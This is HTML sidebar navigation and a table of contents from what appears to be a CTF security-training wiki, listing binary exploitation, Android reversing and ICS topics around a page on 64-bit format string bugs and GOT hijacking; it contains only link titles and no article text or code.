              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../glibc-heap/implementation/free/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Free Heap Memory
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../glibc-heap/implementation/tcache/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Tcache
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../glibc-heap/implementation/malloc_state/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    malloc_state
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../glibc-heap/implementation/misc/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Other
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../glibc-heap/heapoverflow_basic/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Heap Overflow
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../glibc-heap/off_by_one/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Heap-based Off-By-One
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../glibc-heap/chunk_extend_overlapping/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Chunk Extend/Overlapping
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../glibc-heap/unlink.md" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Unlink
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../glibc-heap/use_after_free/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Use After Free
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../glibc-heap/fastbin_attack.md" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Fastbin Attack
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../glibc-heap/unsorted_bin_attack/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Unsorted Bin Attack
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../glibc-heap/large_bin_attack/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Large Bin Attack
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../glibc-heap/tcache_attack.md" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Tcache Attack
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../glibc-heap/house_of_einherjar/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    House of Einherjar
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../glibc-heap/house_of_force/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    House of Force
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../glibc-heap/house_of_lore/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    House of Lore
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../glibc-heap/house_of_orange/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    House of Orange
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../glibc-heap/house_of_rabbit/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    House of Rabbit
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../glibc-heap/house_of_roman/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    House of Roman
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_2_5" >
        
          
          <label class="md-nav__link" for="__nav_8_2_5" id="__nav_8_2_5_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    IO_FILE Related
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_8_2_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8_2_5">
            <span class="md-nav__icon md-icon"></span>
            IO_FILE Related
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../io_file/introduction/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    FILE Structure Description
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../io_file/fake-vtable-exploit/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Forged Vtable to Hijack Control Flow
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../io_file/fsop/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    FSOP
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../io_file/exploit-in-libc2.24/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Use of IO_FILE Under Glibc 2.24
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_2_6" >
        
          
          <label class="md-nav__link" for="__nav_8_2_6" id="__nav_8_2_6_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Race Condition
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_8_2_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8_2_6">
            <span class="md-nav__icon md-icon"></span>
            Race Condition
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../race-condition/introduction/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Race Condition Introduction
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../race-condition/problem/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Example
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_2_7" >
        
          
          <label class="md-nav__link" for="__nav_8_2_7" id="__nav_8_2_7_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Integer Overflow
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_8_2_7_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8_2_7">
            <span class="md-nav__icon md-icon"></span>
            Integer Overflow
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../integeroverflow/intof/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Introduction to The Principle of Integer Overflow
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_2_8" >
        
          
          <label class="md-nav__link" for="__nav_8_2_8" id="__nav_8_2_8_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Sandbox Escape
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_8_2_8_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8_2_8">
            <span class="md-nav__icon md-icon"></span>
            Sandbox Escape
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../sandbox/python-sandbox-escape/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Python Sandbox Escape
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_2_9" >
        
          
          <label class="md-nav__link" for="__nav_8_2_9" id="__nav_8_2_9_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Linux Kernel
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_8_2_9_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8_2_9">
            <span class="md-nav__icon md-icon"></span>
            Linux Kernel
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../kernel/environment/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Environment Setup
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../kernel/basic_knowledge/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Basics
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../kernel/kernel_uaf/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Kernel-UAF
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../kernel/kernel_rop.md" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Kernel-ROP
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../kernel/ret2usr/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    ret2usr
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../kernel/bypass_smep/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    bypass-smep
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../kernel/double-fetch/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Double Fetch
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_2_10" >
        
          
          <label class="md-nav__link" for="__nav_8_2_10" id="__nav_8_2_10_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    arm-pwn
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_8_2_10_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8_2_10">
            <span class="md-nav__icon md-icon"></span>
            arm-pwn
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../arm/environment/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Environment Setup
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../arm/arm_rop/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    arm-rop
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_2_11" >
        
          
          <label class="md-nav__link" for="__nav_8_2_11" id="__nav_8_2_11_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Summary
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_8_2_11_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8_2_11">
            <span class="md-nav__icon md-icon"></span>
            Summary
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../summary/get-address/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Address Leaking
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../summary/hijack-control-flow/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Hijack Control Flow
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../summary/get-shell/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Get Shell
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_3" >
        
          
          <label class="md-nav__link" for="__nav_8_3" id="__nav_8_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Windows Pwn
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_8_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8_3">
            <span class="md-nav__icon md-icon"></span>
            Windows Pwn
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../windows/readme/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Overview
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_3_2" >
        
          
          <label class="md-nav__link" for="__nav_8_3_2" id="__nav_8_3_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Stack Overflow
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_8_3_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8_3_2">
            <span class="md-nav__icon md-icon"></span>
            Stack Overflow
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../windows/stackoverflow/stack-introduce/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Stack Introduction
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../windows/stackoverflow/stackoverflow-basic/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Stack Overflow Basics
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../windows/stackoverflow/shellcode-in-stack/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    shellcode-in-stack
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9" >
        
          
          <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Android
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_9">
            <span class="md-nav__icon md-icon"></span>
            Android
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../android/basic_develop/basic_develop/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Android Development Basics
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9_2" >
        
          
          <label class="md-nav__link" for="__nav_9_2" id="__nav_9_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Android Application Operating Mechanism Brief
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_9_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_9_2">
            <span class="md-nav__icon md-icon"></span>
            Android Application Operating Mechanism Brief
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../android/basic_operating_mechanism/readme/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Basics
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9_2_2" >
        
          
          <label class="md-nav__link" for="__nav_9_2_2" id="__nav_9_2_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    The Operating Mechanism of the Java Layer in Android
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_9_2_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_9_2_2">
            <span class="md-nav__icon md-icon"></span>
            The Operating Mechanism of the Java Layer in Android
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../android/basic_operating_mechanism/java_layer/readme/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Andriod Native
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../android/basic_operating_mechanism/java_layer/smali/smali.md" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Smali Introduction
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9_2_2_3" >
        
          
          <label class="md-nav__link" for="__nav_9_2_2_3" id="__nav_9_2_2_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Dex and ODEX
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_9_2_2_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_9_2_2_3">
            <span class="md-nav__icon md-icon"></span>
            Dex and ODEX
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../android/basic_operating_mechanism/java_layer/dex/dex/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    DEX
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../android/basic_operating_mechanism/java_layer/dex/odex/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    ODEX
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9_2_3" >
        
          
          <label class="md-nav__link" for="__nav_9_2_3" id="__nav_9_2_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Android Native Layer Introduction
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_9_2_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_9_2_3">
            <span class="md-nav__icon md-icon"></span>
            Android Native Layer Introduction
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../android/basic_operating_mechanism/native_layer/so/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Android Shared Object
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9_2_4" >
        
          
          <label class="md-nav__link" for="__nav_9_2_4" id="__nav_9_2_4_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Android Reverse Basic Introduction
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_9_2_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_9_2_4">
            <span class="md-nav__icon md-icon"></span>
            Android Reverse Basic Introduction
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../android/basic_reverse/overview/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Brief Overview
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../android/basic_reverse/android_code_location/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Android Key Part Location
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9_2_4_3" >
        
          
          <label class="md-nav__link" for="__nav_9_2_4_3" id="__nav_9_2_4_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Android Simple Static Analysis
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_9_2_4_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_9_2_4_3">
            <span class="md-nav__icon md-icon"></span>
            Android Simple Static Analysis
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../android/basic_reverse/static/java-example/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Android Java Layer Static Analysis
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../android/basic_reverse/static/so-example/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Android Native Layer Static Analysis
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../android/basic_reverse/static/complex-example/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Android Static Analysis Hybrid Example
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9_2_4_4" >
        
          
          <label class="md-nav__link" for="__nav_9_2_4_4" id="__nav_9_2_4_4_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Android Simple Dynamic Analysis
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_9_2_4_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_9_2_4_4">
            <span class="md-nav__icon md-icon"></span>
            Android Simple Dynamic Analysis
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../android/basic_reverse/dynamic/dynamic_debug/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Dynamic Debugging
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../android/basic_reverse/dynamic/ida_native_debug/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Android Dynamic Debugging SO
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_10" >
        
          
          <label class="md-nav__link" for="__nav_10" id="__nav_10_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    ICS
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_10_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_10">
            <span class="md-nav__icon md-icon"></span>
            ICS
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../ics/ctfs/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    ICS_CTF Contest
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../ics/discover/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    ICS_CTF Discovery
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../ics/exploit/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    ICS_CTF Exploit
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../ics/learn/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    ICS_CTF Learning Resources
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#64-bit-program-format-string-vulnerability" class="md-nav__link">
    <span class="md-ellipsis">
      64-bit program format string vulnerability
    </span>
  </a>
  
    <nav class="md-nav" aria-label="64-bit program format string vulnerability">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#principle" class="md-nav__link">
    <span class="md-ellipsis">
      Principle
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#examples" class="md-nav__link">
    <span class="md-ellipsis">
      Examples
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Examples">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#determining-protection" class="md-nav__link">
    <span class="md-ellipsis">
      Determining protection
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_1" class="md-nav__link">
    <span class="md-ellipsis">
      分析程序
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#determining-the-offset" class="md-nav__link">
    <span class="md-ellipsis">
      Determining the offset
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-the-program" class="md-nav__link">
    <span class="md-ellipsis">
      Using the program
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#hijack-got" class="md-nav__link">
    <span class="md-ellipsis">
      hijack GOT
    </span>
  </a>
  
    <nav class="md-nav" aria-label="hijack GOT">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#principle_1" class="md-nav__link">
    <span class="md-ellipsis">
      Principle
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#examples_1" class="md-nav__link">
    <span class="md-ellipsis">
      Examples
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Examples">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#determining-protection_1" class="md-nav__link">
    <span class="md-ellipsis">
      Determining protection
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_2" class="md-nav__link">
    <span class="md-ellipsis">
      分析程序
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
